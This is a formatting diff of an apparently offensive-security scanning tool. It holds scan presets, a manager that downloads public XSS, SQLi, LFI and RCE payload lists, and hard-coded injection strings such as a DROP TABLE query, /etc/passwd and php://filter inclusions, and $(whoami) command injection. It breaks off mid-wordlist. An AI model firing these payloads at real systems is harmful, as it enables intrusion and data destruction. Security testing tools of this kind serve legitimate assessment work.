                 "port_scan": {"ports": [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]},
-                "fuzzing": {"wordlists": ["directories", "files", "parameters"], "extensions": [".php", ".asp", ".jsp", ".do"]},
+                "fuzzing": {
+                    "wordlists": ["directories", "files", "parameters"],
+                    "extensions": [".php", ".asp", ".jsp", ".do"],
+                },
                 "parameter_discovery": True,
                 "api_testing": True,
-                "concurrency": 20
-            }
+                "concurrency": 20,
+            },
         },
         "api": {
             "name": "API Security Scan",
             "description": "Focused on API endpoint discovery and security testing",
             "duration": "15-30 minutes",
-            "modules": ["subdomain_discovery", "api_discovery", "endpoint_enumeration", "api_vuln_scan"],
+            "modules": [
+                "subdomain_discovery",
+                "api_discovery",
+                "endpoint_enumeration",
+                "api_vuln_scan",
+            ],
             "config": {
-                "nuclei": {"tags": "api,jwt,graphql,rest", "severity": "medium,high,critical"},
+                "nuclei": {
+                    "tags": "api,jwt,graphql,rest",
+                    "severity": "medium,high,critical",
+                },
                 "port_scan": {"ports": [80, 443, 8080, 8443, 3000, 5000, 8001, 9001]},
                 "api_wordlists": ["api_paths", "endpoints", "parameters"],
                 "graphql_discovery": True,
                 "swagger_discovery": True,
-                "concurrency": 15
-            }
+                "concurrency": 15,
+            },
         },
         "cloud": {
             "name": "Cloud Security Scan",
             "description": "Cloud infrastructure and service security assessment",
             "duration": "25-45 minutes",
-            "modules": ["subdomain_discovery", "cloud_storage_enum", "cloud_service_discovery", "cloud_vuln_scan"],
+            "modules": [
+                "subdomain_discovery",
+                "cloud_storage_enum",
+                "cloud_service_discovery",
+                "cloud_vuln_scan",
+            ],
             "config": {
-                "nuclei": {"tags": "cloud,aws,azure,gcp,s3,storage", "severity": "medium,high,critical"},
+                "nuclei": {
+                    "tags": "cloud,aws,azure,gcp,s3,storage",
+                    "severity": "medium,high,critical",
+                },
                 "cloud_providers": ["aws", "azure", "gcp"],
                 "storage_enumeration": True,
                 "cloud_metadata": True,
-                "concurrency": 10
-            }
+                "concurrency": 10,
+            },
         },
         "mobile": {
             "name": "Mobile Application Backend",
             "description": "Security testing for mobile app backend services",
             "duration": "20-40 minutes",
-            "modules": ["subdomain_discovery", "api_discovery", "mobile_endpoint_scan", "mobile_vuln_scan"],
+            "modules": [
+                "subdomain_discovery",
+                "api_discovery",
+                "mobile_endpoint_scan",
+                "mobile_vuln_scan",
+            ],
             "config": {
-                "nuclei": {"tags": "mobile,api,jwt,oauth", "severity": "medium,high,critical"},
+                "nuclei": {
+                    "tags": "mobile,api,jwt,oauth",
+                    "severity": "medium,high,critical",
+                },
                 "port_scan": {"ports": [80, 443, 8080, 8443, 9000, 9001, 3000, 5000]},
                 "mobile_patterns": True,
                 "jwt_testing": True,
                 "oauth_testing": True,
-                "concurrency": 15
-            }
+                "concurrency": 15,
+            },
         },
         "internal": {
             "name": "Internal Network Scan",
             "description": "Internal network and service discovery",
             "duration": "30-60 minutes",
-            "modules": ["network_discovery", "full_port_scan", "service_enumeration", "internal_vuln_scan"],
+            "modules": [
+                "network_discovery",
+                "full_port_scan",
+                "service_enumeration",
+                "internal_vuln_scan",
+            ],
             "config": {
-                "nuclei": {"tags": "network,smb,ssh,rdp,ftp", "severity": "low,medium,high,critical"},
+                "nuclei": {
+                    "tags": "network,smb,ssh,rdp,ftp",
+                    "severity": "low,medium,high,critical",
+                },
                 "port_scan": {"all_ports": True, "timing": 4},
                 "network_scan": True,
                 "service_enumeration": True,
                 "internal_services": True,
-                "concurrency": 20
-            }
+                "concurrency": 20,
+            },
         },
         "bounty": {
             "name": "Bug Bounty Optimized",
             "description": "Optimized for bug bounty hunting with comprehensive coverage",
             "duration": "60-120 minutes",
-            "modules": ["extensive_subdomain_discovery", "full_port_scan", "directory_fuzzing", "parameter_discovery", "comprehensive_vuln_scan", "manual_verification"],
+            "modules": [
+                "extensive_subdomain_discovery",
+                "full_port_scan",
+                "directory_fuzzing",
+                "parameter_discovery",
+                "comprehensive_vuln_scan",
+                "manual_verification",
+            ],
             "config": {
-                "nuclei": {"severity": "info,low,medium,high,critical", "all_templates": True},
+                "nuclei": {
+                    "severity": "info,low,medium,high,critical",
+                    "all_templates": True,
+                },
                 "subdomain_tools": ["all_available"],
                 "fuzzing": {"wordlist": "extensive", "threads": 100, "recursive": True},
                 "parameter_discovery": True,
                 "tech_stack_analysis": True,
                 "comprehensive_crawling": True,
                 "manual_verification": True,
-                "concurrency": 50
-            }
-        }
+                "concurrency": 50,
+            },
+        },
     }
 
     @staticmethod
-
     def list_presets():
         """Display available scan presets"""
         print("\n\033[92m🎯 Available Scan Presets:\033[0m")
@@ -1728,13 +2037,11 @@ class ScanPresets:
             print(f"    🔧 Modules: {', '.join(preset['modules'])}")
 
     @staticmethod
-
     def get_preset(preset_name: str) -> Optional[Dict[str, Any]]:
         """Get a scan preset by name"""
         return ScanPresets.SCAN_PRESETS.get(preset_name.lower())
 
     @staticmethod
-
     def run_preset_scan(preset_name: str, targets: List[str] = None):
         """Run a scan using a preset configuration"""
         preset = ScanPresets.get_preset(preset_name)
@@ -1810,6 +2117,7 @@ class ScanPresets:
             stage_report(rd, env, cfg)
             logger.log(f"{preset['name']} scan completed", "SUCCESS")
 
+
 def run_preset_scan_menu():
     """Interactive menu for preset scan selection"""
     print(f"\n\033[96m{'='*80}\033[0m")
@@ -1821,7 +2129,7 @@ def run_preset_scan_menu():
     print("\n\033[95mSelect a preset or 'back' to return:\033[0m")
     choice = input("\033[93mPreset name: \033[0m").strip().lower()
 
-    if choice == 'back':
+    if choice == "back":
         return
 
     preset = ScanPresets.get_preset(choice)
@@ -1845,14 +2153,19 @@ def run_preset_scan_menu():
         input("Press Enter to continue...")
         return
 
-    confirm = input(f"\n\033[93mProceed with {preset['name']} scan? (yes/no): \033[0m").strip().lower()
+    confirm = (
+        input(f"\n\033[93mProceed with {preset['name']} scan? (yes/no): \033[0m")
+        .strip()
+        .lower()
+    )
 
-    if confirm == 'yes':
+    if confirm == "yes":
         ScanPresets.run_preset_scan(choice, targets)
     else:
         logger.log("Scan cancelled", "INFO")
 
     input("Press Enter to continue...")
+
 
 # Supporting functions for preset scans
 def run_subdomain_discovery_with_config(rd, env, cfg, preset_config):
@@ -1870,16 +2183,19 @@ def run_subdomain_discovery_with_config(rd, env, cfg, preset_config):
 
     stage_recon(rd, env, cfg)  # Use existing function with config override
 
+
 def run_port_scan_with_config(rd, env, cfg, scan_config):
     """Run port scan with specific configuration"""
     # This would integrate with the port scanning functionality
     # Implementation depends on the existing port scan functions
     pass
 
+
 def run_http_probe_with_config(rd, env, cfg, preset_config):
     """Run HTTP probing with preset configuration"""
     # Use existing HTTP probing functionality
     pass
+
 
 def run_directory_fuzzing_with_config(rd, env, cfg, preset_config):
     """Run directory fuzzing with preset configuration"""
@@ -1887,35 +2203,42 @@ def run_directory_fuzzing_with_config(rd, env, cfg, preset_config):
     # Implementation would use existing fuzzing functions
     pass
 
+
 def run_parameter_discovery_with_config(rd, env, cfg, preset_config):
     """Run parameter discovery with preset configuration"""
     if preset_config.get("parameter_discovery"):
         # Use arjun or similar tools for parameter discovery
         pass
 
+
 def run_vulnerability_scan_with_config(rd, env, cfg, preset_config):
     """Run vulnerability scanning with preset configuration"""
     stage_vuln_scan(rd, env, cfg)  # Use existing function
+
 
 def run_tech_detection_with_config(rd, env, cfg, preset_config):
     """Run technology detection with preset configuration"""
     # Use whatweb, httpx tech-detect, etc.
     pass
 
+
 def run_web_crawling_with_config(rd, env, cfg, preset_config):
     """Run web crawling with preset configuration"""
     # Use waybackurls, gau, gospider, etc.
     pass
+
 
 def run_api_testing_with_config(rd, env, cfg, preset_config):
     """Run API testing with preset configuration"""
     # Use API-specific tools and tests
     pass
 
+
 def check_stop_condition() -> bool:
     """Check if user wants to stop the scan"""
     # Implementation for graceful stopping
     return False
+
 
 class EnhancedPayloadManager:
     """Advanced payload and wordlist management system"""
@@ -1926,68 +2249,83 @@ class EnhancedPayloadManager:
             "sources": [
                 "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
                 "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md",
-                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt"
+                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt",
             ],
-            "local_files": ["xss_basic.txt", "xss_advanced.txt", "xss_bypass.txt"]
+            "local_files": ["xss_basic.txt", "xss_advanced.txt", "xss_bypass.txt"],
         },
         "sqli": {
             "description": "SQL Injection payloads",
             "sources": [
                 "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit_payloads.txt",
                 "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/README.md",
-                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt"
+                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt",
             ],
-            "local_files": ["sqli_basic.txt", "sqli_mssql.txt", "sqli_mysql.txt", "sqli_oracle.txt", "sqli_postgresql.txt"]
+            "local_files": [
+                "sqli_basic.txt",
+                "sqli_mssql.txt",
+                "sqli_mysql.txt",
+                "sqli_oracle.txt",
+                "sqli_postgresql.txt",
+            ],
         },
         "lfi": {
             "description": "Local File Inclusion payloads",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
-                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt"
+                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt",
             ],
-            "local_files": ["lfi_linux.txt", "lfi_windows.txt", "lfi_generic.txt"]
+            "local_files": ["lfi_linux.txt", "lfi_windows.txt", "lfi_generic.txt"],
         },
         "rfi": {
             "description": "Remote File Inclusion payloads",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt"
             ],
-            "local_files": ["rfi_basic.txt", "rfi_advanced.txt"]
+            "local_files": ["rfi_basic.txt", "rfi_advanced.txt"],
         },
         "rce": {
             "description": "Remote Code Execution payloads",
             "sources": [
                 "https://raw.githubusercontent.com/payloadbox/rce-payload-list/master/rce-payload-list.txt",
-                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md"
+                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md",
             ],
-            "local_files": ["rce_linux.txt", "rce_windows.txt", "rce_generic.txt"]
+            "local_files": ["rce_linux.txt", "rce_windows.txt", "rce_generic.txt"],
         },
         "xxe": {
             "description": "XML External Entity payloads",
             "sources": [
                 "https://raw.githubusercontent.com/payloadbox/xxe-payload-list/master/xxe-payload-list.txt"
             ],
-            "local_files": ["xxe_basic.txt", "xxe_advanced.txt"]
+            "local_files": ["xxe_basic.txt", "xxe_advanced.txt"],
         },
         "ssti": {
             "description": "Server-Side Template Injection payloads",
             "sources": [
                 "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/README.md"
             ],
-            "local_files": ["ssti_jinja2.txt", "ssti_twig.txt", "ssti_smarty.txt", "ssti_generic.txt"]
+            "local_files": [
+                "ssti_jinja2.txt",
+                "ssti_twig.txt",
+                "ssti_smarty.txt",
+                "ssti_generic.txt",
+            ],
         },
         "idor": {
             "description": "Insecure Direct Object Reference payloads",
-            "local_files": ["idor_numeric.txt", "idor_uuid.txt", "idor_base64.txt"]
+            "local_files": ["idor_numeric.txt", "idor_uuid.txt", "idor_base64.txt"],
         },
         "csrf": {
             "description": "Cross-Site Request Forgery payloads",
-            "local_files": ["csrf_tokens.txt", "csrf_bypass.txt"]
+            "local_files": ["csrf_tokens.txt", "csrf_bypass.txt"],
         },
         "auth_bypass": {
             "description": "Authentication bypass payloads",
-            "local_files": ["auth_bypass_sql.txt", "auth_bypass_nosql.txt", "auth_bypass_ldap.txt"]
-        }
+            "local_files": [
+                "auth_bypass_sql.txt",
+                "auth_bypass_nosql.txt",
+                "auth_bypass_ldap.txt",
+            ],
+        },
     }
 
     WORDLIST_CATEGORIES = {
@@ -1997,56 +2335,78 @@ class EnhancedPayloadManager:
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt",
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
                 "https://raw.githubusercontent.com/six2dez/OneListForAll/main/onelistforallmicro.txt",
-                "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt"
+                "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt",
             ],
-            "local_files": ["dirs_common.txt", "dirs_medium.txt", "dirs_large.txt", "dirs_api.txt"]
+            "local_files": [
+                "dirs_common.txt",
+                "dirs_medium.txt",
+                "dirs_large.txt",
+                "dirs_api.txt",
+            ],
         },
         "files": {
             "description": "File and extension wordlists",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt",
-                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt"
+                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt",
             ],
-            "local_files": ["files_common.txt", "files_backup.txt", "files_config.txt", "files_logs.txt"]
+            "local_files": [
+                "files_common.txt",
+                "files_backup.txt",
+                "files_config.txt",
+                "files_logs.txt",
+            ],
         },
         "parameters": {
             "description": "Parameter name wordlists",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt",
-                "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/wordlists/params.txt"
+                "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/wordlists/params.txt",
             ],
-            "local_files": ["params_common.txt", "params_api.txt", "params_php.txt", "params_asp.txt"]
+            "local_files": [
+                "params_common.txt",
+                "params_api.txt",
+                "params_php.txt",
+                "params_asp.txt",
+            ],
         },
         "subdomains": {
             "description": "Subdomain wordlists",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt",
-                "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt"
+                "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains.txt",
             ],
-            "local_files": ["subdomains_common.txt", "subdomains_top1k.txt", "subdomains_top10k.txt"]
+            "local_files": [
+                "subdomains_common.txt",
+                "subdomains_top1k.txt",
+                "subdomains_top10k.txt",
+            ],
         },
         "vhosts": {
             "description": "Virtual host wordlists",
-            "local_files": ["vhosts_common.txt", "vhosts_api.txt", "vhosts_admin.txt"]
+            "local_files": ["vhosts_common.txt", "vhosts_api.txt", "vhosts_admin.txt"],
         },
         "users": {
             "description": "Username wordlists",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"
             ],
-            "local_files": ["users_common.txt", "users_admin.txt", "users_service.txt"]
+            "local_files": ["users_common.txt", "users_admin.txt", "users_service.txt"],
         },
         "passwords": {
             "description": "Password wordlists",
             "sources": [
                 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
             ],
-            "local_files": ["passwords_common.txt", "passwords_weak.txt", "passwords_default.txt"]
-        }
+            "local_files": [
+                "passwords_common.txt",
+                "passwords_weak.txt",
+                "passwords_default.txt",
+            ],
+        },
     }
 
     @staticmethod
-
     def initialize_payload_structure():
         """Initialize payload directory structure"""
         try:
@@ -2071,10 +2431,13 @@ class EnhancedPayloadManager:
             return False
 
     @staticmethod
-
-    def download_payload_sources(category: str = None, force_update: bool = False) -> bool:
+    def download_payload_sources(
+        category: str = None, force_update: bool = False
+    ) -> bool:
         """Download payload sources from remote repositories"""
-        categories_to_update = [category] if category else EnhancedPayloadManager.PAYLOAD_CATEGORIES.keys()
+        categories_to_update = (
+            [category] if category else EnhancedPayloadManager.PAYLOAD_CATEGORIES.keys()
+        )
 
         success_count = 0
         total_count = 0
@@ -2089,18 +2452,22 @@ class EnhancedPayloadManager:
                 try:
                     # Generate filename from URL
                     filename = Path(source_url).name
-                    if not filename.endswith(('.txt', '.md')):
-                        filename += '.txt'
+                    if not filename.endswith((".txt", ".md")):
+                        filename += ".txt"
 
                     output_file = PAYLOADS_DIR / cat / filename
 
                     # Skip if file exists and not forcing update
                     if output_file.exists() and not force_update:
-                        logger.log(f"Skipping existing payload: {output_file.name}", "INFO")
+                        logger.log(
+                            f"Skipping existing payload: {output_file.name}", "INFO"
+                        )
                         continue
 
                     # Download with fallback tools
-                    download_tool = get_best_available_tool("curl") or get_best_available_tool("wget")
+                    download_tool = get_best_available_tool(
+                        "curl"
+                    ) or get_best_available_tool("wget")
 
                     if download_tool == "curl":
                         cmd = ["curl", "-s", "-L", "-o", str(output_file), source_url]
@@ -2109,6 +2476,7 @@ class EnhancedPayloadManager:
                     else:
                         # Fallback to Python requests
                         import requests
+
                         response = requests.get(source_url, timeout=30)
                         response.raise_for_status()
                         output_file.write_text(response.text)
@@ -2126,11 +2494,13 @@ class EnhancedPayloadManager:
                 except Exception as e:
                     logger.log(f"Error downloading {source_url}: {e}", "ERROR")
 
-        logger.log(f"Payload download complete: {success_count}/{total_count} successful", "INFO")
+        logger.log(
+            f"Payload download complete: {success_count}/{total_count} successful",
+            "INFO",
+        )
         return success_count > 0
 
     @staticmethod
-
     def create_custom_payloads():
         """Create custom payload files with common exploit patterns"""
 
@@ -2174,7 +2544,7 @@ class EnhancedPayloadManager:
             "'; DROP TABLE users--",
             "1; SELECT * FROM users WHERE 't' = 't'",
             "1 AND (SELECT COUNT(*) FROM sysobjects) > 0",
-            "1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0"
+            "1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
         ]
 
         # LFI Payloads
@@ -2197,7 +2567,7 @@ class EnhancedPayloadManager:
             "php://filter/convert.base64-encode/resource=index.php",
             "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B",
             "expect://id",
-            "file:///etc/passwd"
+            "file:///etc/passwd",
         ]
 
         # Command Injection Payloads
@@ -2225,7 +2595,7 @@ class EnhancedPayloadManager:
             "&& whoami",
             "|| whoami",
             "`whoami`",
-            "$(whoami)"
+            "$(whoami)",
         ]
 
         # Create payload files
@@ -2233,7 +2603,7 @@ class EnhancedPayloadManager:
             "xss/xss_basic.txt": xss_payloads,
             "sqli/sqli_basic.txt": sqli_payloads,
             "lfi/lfi_basic.txt": lfi_payloads,
-            "rce/rce_basic.txt": rce_payloads
+            "rce/rce_basic.txt": rce_payloads,
         }
 
         for file_path, payloads in payload_sets.items():
@@ -2241,7 +2611,7 @@ class EnhancedPayloadManager:
             output_file.parent.mkdir(exist_ok=True)
 
             try:
-                with open(output_file, 'w') as f:
+                with open(output_file, "w") as f:
                     for payload in payloads:
                         f.write(f"{payload}\n")
                 logger.log(f"Created custom payload file: {file_path}", "SUCCESS")
@@ -2249,102 +2619,484 @@ class EnhancedPayloadManager:
                 logger.log(f"Failed to create payload file {file_path}: {e}", "ERROR")
 
     @staticmethod
-
     def create_enhanced_wordlists():
         """Create enhanced wordlists for various discovery purposes"""
 
         # Common directories (expanded)
         common_dirs = [
-            "admin", "administrator", "api", "app", "application", "apps", "auth",
-            "backup", "backups", "bin", "blog", "cache", "cgi-bin", "cms", "config",
-            "content", "css", "dashboard", "data", "database", "db", "dev", "development",
-            "doc", "docs", "download", "downloads", "etc", "files", "forum", "ftp",
-            "git", "help", "home", "html", "images", "img", "inc", "include", "includes",
-            "js", "json", "lib", "library", "log", "logs", "mail", "media", "mobile",
-            "news", "old", "panel", "private", "public", "root", "scripts", "search",
-            "secure", "security", "shop", "src", "static", "stats", "system", "temp",
-            "test", "testing", "tmp", "upload", "uploads", "user", "users", "var",
-            "web", "webmail", "website", "www", "xml", "assets", "build", "dist",
-            "node_modules", "vendor", "storage", "resources", "tools", "utils",
-            "bootstrap", "jquery", "fonts", "icons", "themes", "plugins", "modules",
-            "wp-content", "wp-admin", "wp-includes", "wordpress", "joomla", "drupal",
-            "phpmyadmin", "phpinfo", "info", "server-info", "server-status", "status",
-            "health", "metrics", "debug", "trace", "error", "errors", "exception",
-            "trace", "phpunit", "test-suite", "tests", "testing", "qa", "stage", "staging"
+            "admin",
+            "administrator",
+            "api",
+            "app",
+            "application",
+            "apps",
+            "auth",
+            "backup",
+            "backups",
+            "bin",
+            "blog",
+            "cache",
+            "cgi-bin",
+            "cms",
+            "config",
+            "content",
+            "css",
+            "dashboard",
+            "data",
+            "database",
+            "db",
+            "dev",
+            "development",
+            "doc",
+            "docs",
+            "download",
+            "downloads",
+            "etc",
+            "files",
+            "forum",
+            "ftp",
+            "git",
+            "help",
+            "home",
+            "html",
+            "images",
+            "img",
+            "inc",
+            "include",
+            "includes",
+            "js",
+            "json",
+            "lib",
+            "library",
+            "log",
+            "logs",
+            "mail",
+            "media",
+            "mobile",
+            "news",
+            "old",
+            "panel",
+            "private",
+            "public",
+            "root",
+            "scripts",
+            "search",
+            "secure",
+            "security",
+            "shop",
+            "src",
+            "static",
+            "stats",
+            "system",
+            "temp",
+            "test",
+            "testing",
+            "tmp",
+            "upload",
+            "uploads",
+            "user",
+            "users",
+            "var",
+            "web",
+            "webmail",
+            "website",
+            "www",
+            "xml",
+            "assets",
+            "build",
+            "dist",
+            "node_modules",
+            "vendor",
+            "storage",
+            "resources",
+            "tools",
+            "utils",
+            "bootstrap",
+            "jquery",
+            "fonts",
+            "icons",
+            "themes",
+            "plugins",
+            "modules",
+            "wp-content",
+            "wp-admin",
+            "wp-includes",
+            "wordpress",
+            "joomla",
+            "drupal",
+            "phpmyadmin",
+            "phpinfo",
+            "info",
+            "server-info",
+            "server-status",
+            "status",
+            "health",
+            "metrics",
+            "debug",
+            "trace",
+            "error",
+            "errors",
+            "exception",
+            "trace",
+            "phpunit",
+            "test-suite",
+            "tests",
+            "testing",
+            "qa",
+            "stage",
+            "staging",
         ]
 
         # Extended API endpoints
         api_paths = [
-            "api/v1", "api/v2", "api/v3", "api/v4", "rest", "restapi", "graphql", "soap",
-            "api/users", "api/login", "api/auth", "api/token", "api/admin", "api/config",
-            "api/status", "api/health", "api/docs", "api/swagger", "api/openapi",
-            "v1/users", "v1/auth", "v1/admin", "v2/users", "v2/auth", "v3/users",
-            "api/internal", "api/public", "api/private", "api/external", "api/webhook",
-            "webhook", "webhooks", "callback", "callbacks", "notify", "notifications",
-            "oauth", "oauth2", "saml", "sso", "ldap", "ad", "connect", "integration",
-            "sync", "import", "export", "bulk", "batch", "queue", "jobs", "tasks",
-            "search", "filter", "query", "analytics", "reports", "dashboard-api",
-            "mobile-api", "app-api", "internal-api", "service-api", "micro-service"
+            "api/v1",
+            "api/v2",
+            "api/v3",
+            "api/v4",
+            "rest",
+            "restapi",
+            "graphql",
+            "soap",
+            "api/users",
+            "api/login",
+            "api/auth",
+            "api/token",
+            "api/admin",
+            "api/config",
+            "api/status",
+            "api/health",
+            "api/docs",
+            "api/swagger",
+            "api/openapi",
+            "v1/users",
+            "v1/auth",
+            "v1/admin",
+            "v2/users",
+            "v2/auth",
+            "v3/users",
+            "api/internal",
+            "api/public",
+            "api/private",
+            "api/external",
+            "api/webhook",
+            "webhook",
+            "webhooks",
+            "callback",
+            "callbacks",
+            "notify",
+            "notifications",
+            "oauth",
+            "oauth2",
+            "saml",
+            "sso",
+            "ldap",
+            "ad",
+            "connect",
+            "integration",
+            "sync",
+            "import",
+            "export",
+            "bulk",
+            "batch",
+            "queue",
+            "jobs",
+            "tasks",
+            "search",
+            "filter",
+            "query",
+            "analytics",
+            "reports",
+            "dashboard-api",
+            "mobile-api",
+            "app-api",
+            "internal-api",
+            "service-api",
+            "micro-service",
         ]
 
         # Extended parameter names
         common_params = [
-            "id", "user", "username", "password", "email", "token", "key", "api_key",
-            "access_token", "auth", "session", "sid", "csr", "nonce", "callback",
-            "redirect", "url", "path", "file", "filename", "page", "cmd", "command",
-            "exec", "system", "shell", "query", "search", "filter", "sort", "order",
-            "limit", "offset", "count", "format", "type", "method", "action", "debug",
-            "lang", "locale", "theme", "skin", "template", "layout", "view", "mode",
-            "admin", "role", "permission", "scope", "level", "access", "privilege",
-            "secret", "private", "public", "hidden", "internal", "external", "data",
-            "payload", "content", "body", "message", "text", "value", "input", "output",
-            "source", "target", "destination", "origin", "referer", "referrer", "host",
-            "domain", "subdomain", "port", "protocol", "scheme", "endpoint", "service",
-            "module", "component", "widget", "plugin", "extension", "addon", "feature"
+            "id",
+            "user",
+            "username",
+            "password",
+            "email",
+            "token",
+            "key",
+            "api_key",
+            "access_token",
+            "auth",
+            "session",
+            "sid",
+            "csr",
+            "nonce",
+            "callback",
+            "redirect",
+            "url",
+            "path",
+            "file",
+            "filename",
+            "page",
+            "cmd",
+            "command",
+            "exec",
+            "system",
+            "shell",
+            "query",
+            "search",
+            "filter",
+            "sort",
+            "order",
+            "limit",
+            "offset",
+            "count",
+            "format",
+            "type",
+            "method",
+            "action",
+            "debug",
+            "lang",
+            "locale",
+            "theme",
+            "skin",
+            "template",
+            "layout",
+            "view",
+            "mode",
+            "admin",
+            "role",
+            "permission",
+            "scope",
+            "level",
+            "access",
+            "privilege",
+            "secret",
+            "private",
+            "public",
+            "hidden",
+            "internal",
+            "external",
+            "data",
+            "payload",
+            "content",
+            "body",
+            "message",
+            "text",
+            "value",
+            "input",
+            "output",
+            "source",
+            "target",
+            "destination",
+            "origin",
+            "referer",
+            "referrer",
+            "host",
+            "domain",
+            "subdomain",
+            "port",
+            "protocol",
+            "scheme",
+            "endpoint",
+            "service",
+            "module",
+            "component",
+            "widget",
+            "plugin",
+            "extension",
+            "addon",
+            "feature",
         ]
 
         # Extended subdomain prefixes
         subdomain_prefixes = [
-            "www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "prod",
-            "blog", "shop", "store", "app", "mobile", "m", "secure", "vpn", "remote",
-            "support", "help", "docs", "wiki", "portal", "dashboard", "panel", "cpanel",
-            "webmail", "email", "smtp", "pop", "imap", "ns1", "ns2", "dns", "cdn",
-            "assets", "static", "media", "images", "img", "files", "uploads", "download",
-            "git", "svn", "repo", "code", "source", "build", "ci", "jenkins", "gitlab",
-            "github", "bitbucket", "jira", "confluence", "slack", "teams", "chat",
-            "forum", "community", "social", "network", "connect", "share", "link",
-            "go", "short", "tiny", "bit", "link", "redirect", "proxy", "gateway",
-            "load", "balance", "cluster", "node", "worker", "master", "slave", "db",
-            "database", "sql", "mongo", "redis", "elastic", "search", "solr", "ldap",
-            "directory", "auth", "sso", "oauth", "saml", "identity", "iam", "rbac",
-            "monitoring", "metrics", "logs", "trace", "debug", "error", "exception"
+            "www",
+            "mail",
+            "ftp",
+            "admin",
+            "api",
+            "dev",
+            "test",
+            "staging",
+            "prod",
+            "blog",
+            "shop",
+            "store",
+            "app",
+            "mobile",
+            "m",
+            "secure",
+            "vpn",
+            "remote",
+            "support",
+            "help",
+            "docs",
+            "wiki",
+            "portal",
+            "dashboard",
+            "panel",
+            "cpanel",
+            "webmail",
+            "email",
+            "smtp",
+            "pop",
+            "imap",
+            "ns1",
+            "ns2",
+            "dns",
+            "cdn",
+            "assets",
+            "static",
+            "media",
+            "images",
+            "img",
+            "files",
+            "uploads",
+            "download",
+            "git",
+            "svn",
+            "repo",
+            "code",
+            "source",
+            "build",
+            "ci",
+            "jenkins",
+            "gitlab",
+            "github",
+            "bitbucket",
+            "jira",
+            "confluence",
+            "slack",
+            "teams",
+            "chat",
+            "forum",
+            "community",
+            "social",
+            "network",
+            "connect",
+            "share",
+            "link",
+            "go",
+            "short",
+            "tiny",
+            "bit",
+            "link",
+            "redirect",
+            "proxy",
+            "gateway",
+            "load",
+            "balance",
+            "cluster",
+            "node",
+            "worker",
+            "master",
+            "slave",
+            "db",
+            "database",
+            "sql",
+            "mongo",
+            "redis",
+            "elastic",
+            "search",
+            "solr",
+            "ldap",
+            "directory",
+            "auth",
+            "sso",
+            "oauth",
+            "saml",
+            "identity",
+            "iam",
+            "rbac",
+            "monitoring",
+            "metrics",
+            "logs",
+            "trace",
+            "debug",
+            "error",
+            "exception",
         ]
 
         # Technology-specific wordlists
         tech_specific = {
-            "php": ["index.php", "config.php", "admin.php", "login.php", "upload.php",
-                   "info.php", "phpinfo.php", "test.php", "backup.php", "database.php"],
-            "asp": ["default.asp", "index.asp", "admin.asp", "login.asp", "config.asp",
-                   "global.asa", "web.config", "default.aspx", "admin.aspx"],
-            "jsp": ["index.jsp", "admin.jsp", "login.jsp", "config.jsp", "web.xml",
-                   "WEB-INF/web.xml", "META-INF/context.xml"],
+            "php": [
+                "index.php",
+                "config.php",
+                "admin.php",
+                "login.php",
+                "upload.php",
+                "info.php",
+                "phpinfo.php",
+                "test.php",
+                "backup.php",
+                "database.php",
+            ],
+            "asp": [
+                "default.asp",
+                "index.asp",
+                "admin.asp",
+                "login.asp",
+                "config.asp",
+                "global.asa",
+                "web.config",
+                "default.aspx",
+                "admin.aspx",
+            ],
+            "jsp": [
+                "index.jsp",
+                "admin.jsp",
+                "login.jsp",
+                "config.jsp",
+                "web.xml",
+                "WEB-INF/web.xml",
